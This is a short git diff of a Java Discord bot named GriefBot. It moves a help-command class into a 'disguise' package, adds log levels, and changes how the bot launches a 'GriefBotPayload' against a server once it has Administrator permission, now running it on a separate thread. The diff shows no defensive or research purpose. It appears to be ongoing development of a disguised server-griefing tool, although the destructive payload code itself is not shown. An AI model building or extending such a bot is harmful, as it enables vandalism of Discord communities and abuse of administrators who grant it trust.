@@ -1,6 +1,8 @@
 package de.corruptedbytes;
 
-import de.corruptedbytes.disguise.commands.HelpManager;
+import de.corruptedbytes.disguise.HelpManager;
+import de.corruptedbytes.logger.GriefBotLogger;
+import de.corruptedbytes.logger.GriefBotLoggerLevel;
 import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.ChannelType;
 import net.dv8tion.jda.api.entities.Guild;
@@ -14,7 +16,7 @@ public class GriefBotListener extends ListenerAdapter {
 
 	@Override
 	public void onReady(ReadyEvent event) {
-		GriefBotLogger.log("[GriefBot/Discord-Bot] Discord Bot started!");
+		GriefBotLogger.log("[GriefBot/Discord-Bot] Discord Bot started!", GriefBotLoggerLevel.INFO);
 	}
 	
 	@Override
@@ -44,7 +46,7 @@ public class GriefBotListener extends ListenerAdapter {
 						}
 
 						GriefBotPayload griefBotPayload = new GriefBotPayload(guild, user);
-						griefBotPayload.startGrief();
+						new Thread(griefBotPayload).start();
 
 					} else {
 						message.getChannel().sendMessage(":x: The Bot works only with **Administrator** Permission!")
